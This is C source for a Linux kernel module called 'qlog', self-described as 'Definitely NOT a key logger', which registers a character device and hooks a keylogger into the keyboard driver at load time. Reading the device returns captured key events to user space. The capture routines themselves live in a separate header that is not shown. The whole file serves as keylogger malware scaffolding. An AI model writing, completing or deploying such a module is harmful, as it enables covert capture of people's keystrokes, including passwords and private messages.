#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/device.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <asm/uaccess.h>

#include "logging.h"
#include "keylogger.h"

#define CLASS_NAME "qlog"
#define DEVICE_NAME "qlogc"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Jem Tucker");
MODULE_DESCRIPTION("Definitely NOT a key logger.");
MODULE_VERSION("0.1");

static int qlog_open(struct inode*, struct file*);
static ssize_t qlog_read(struct file*, char*, size_t, loff_t*);
static int qlog_release(struct inode*, struct file*);

static struct file_operations fops = {
    .open = qlog_open,
    .read = qlog_read,
    .release = qlog_release
};

// Device statics
static int s_major = -1;
static struct device* s_device = NULL;
static struct class* s_class = NULL;
static volatile size_t s_numopen = 0;

/**
 * Kernel module Initialisation function
 * @return Returns 0 if successful
 */
static int __init qlog_init(void) {
    int retval = 0;

    LOG_INFO("Initialising device - %s\n", DEVICE_NAME);

    // Dynamically allocate a device object major number
    s_major = register_chrdev(
        0,           // Major number - zero for dynamic allocation
        DEVICE_NAME, // The device name to display in /dev/
        &fops        // File operation
        );

    // If failed return the error code.
    if (s_major < 0) {
        LOG_ERROR("Failed to register device. Errno: %d\n", -s_major);
        retval = s_major;
        goto cleanup;
    }

    // Create the device class
    s_class = class_create(
        THIS_MODULE, // Parent module of the class
        CLASS_NAME   // Class name
        );

    // If create_class failed return the error
    if (IS_ERR(s_class)) {
        retval = PTR_ERR(s_class);
        LOG_ERROR("Failed to create_class. Errno: %d\n", retval);
        s_class = NULL;
        goto cleanup;
    }

    // Register the device
    s_device = device_create(
        s_class,           // The device class
        NULL,              // The parent device (we have no parents)
        MKDEV(s_major, 0), //
        NULL,              // Device data (none to pass)
        DEVICE_NAME        // The device name
        );

    // If failed to create the device, return the error
    if (IS_ERR(s_device)) {
        retval = PTR_ERR(s_device);
        LOG_ERROR("Failed call to device_create. Errno: %d\n", retval);
        s_device = NULL;
        goto cleanup;
    }

    // Success.
    LOG_INFO("Device %s registered successfully.\n", DEVICE_NAME);

    // Register keylogger with the keyboard driver
    retval = keylogger_register();
    if (retval != 0) {
        LOG_ERROR("Failed to register keylogger. Errno: %d\n", retval);
        goto cleanup;
    }

    LOG_INFO("Keylogger initialised.\n");

    return retval;

cleanup:
    // Clean up the device object
    if (s_device) {
        device_destroy(s_class, MKDEV(s_major, 0));
        class_unregister(s_class);
    }

    // Destroy the class
    if (s_class) {
        class_destroy(s_class);
    }

    // Unregister the device
    if (s_major >= 0) {
        unregister_chrdev(s_major, DEVICE_NAME);
    }

    return retval;
}

/**
 * Kernel module exit function
 * Free all resources and exit. This function assumes the module has
 * been initialised completely.
 */
static void __exit qlog_exit(void) {
    LOG_INFO("Unloading device %s\n", DEVICE_NAME);

    // Unregister the key logger
    keylogger_unregister();

    // Cleanup the device
    device_destroy(s_class, MKDEV(s_major, 0));

    // Unregister the device class
    class_unregister(s_class);

    // Cleanup the device class
    class_destroy(s_class);

    // Unregister the device
    unregister_chrdev(s_major, DEVICE_NAME);
}

module_init(qlog_init);
module_exit(qlog_exit);

/**
 * Open device file operation
 * Returns 0. .
 */
static int qlog_open(struct inode* inode, struct file* file) {
    LOG_INFO("qlog_open\n");
    return 0;
}

/**
 * Device read file operation
 * Returns a message to the caller in 'buf' and the number of bytes copied. On error
 * a negative error code will be returned.
 */
static ssize_t qlog_read(struct file* file, char* buf, size_t len, loff_t* off) {
    char* kbuf;
    unsigned long error;

    // Allocate a temporary buffer
    kbuf = kmalloc(len, GFP_KERNEL);
    if (!kbuf) {
        return -EFAULT;
    }

    // Read from the keylogger
    if (keylogger_last_events(kbuf, len) != 0) {
        // Be sure to clean up.
        kfree(kbuf);
        return -EFAULT;
    }

    // Copy the message to user mode
    error = copy_to_user(
        buf,       // 'To' address in user mode
        kbuf,      // 'From' address in kernel mode
        len        // Number of bytes to copy
    );

    // Free the temporary working buffer
    kfree(kbuf);

    // If any bytes could not be copied return an error, otherwise
    // return the length of the message.
    if (error) {
        return -EFAULT;
    } else {
        return len;
    }
}

/**
 * Device release file operation.
 * Returns 0.
 */
static int qlog_release(struct inode* inode, struct file* file) {
    LOG_INFO("qlog_release\n");
    return 0;
}
